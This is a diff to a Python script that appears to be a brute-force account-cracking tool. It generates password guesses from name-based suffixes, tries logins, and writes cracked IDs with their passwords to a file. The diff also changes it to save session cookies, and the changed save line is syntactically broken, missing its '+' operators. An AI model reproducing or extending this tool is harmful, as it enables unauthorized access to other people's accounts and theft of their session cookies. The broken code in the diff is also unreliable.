@@ -286,7 +286,7 @@ def menu():
     elif TUTUL in ['1']:
         crack_file()
     elif TUTUL in ['2','02']:
-        os.system('xdg-open https://wa.me/+8801608843956')
+        os.system('xdg-open https://wa.me/+918302788872')
         os.system("python nono.py")
     elif TUTUL in ['3','03']:
         result()
@@ -590,7 +590,6 @@ def passwrd():
                     pwv.append(frs+'@#')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'11')
-                    pwv.append(frs+'111')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -690,7 +689,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Tutul-Ok] {idf} • {pw} ')
                 os.system('espeak -a 300 " Ok,  Tutul,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('OK/'+okc,'a').write(idf+'|'+pw+'|' kuki '\n')
                 break
                 
             else:
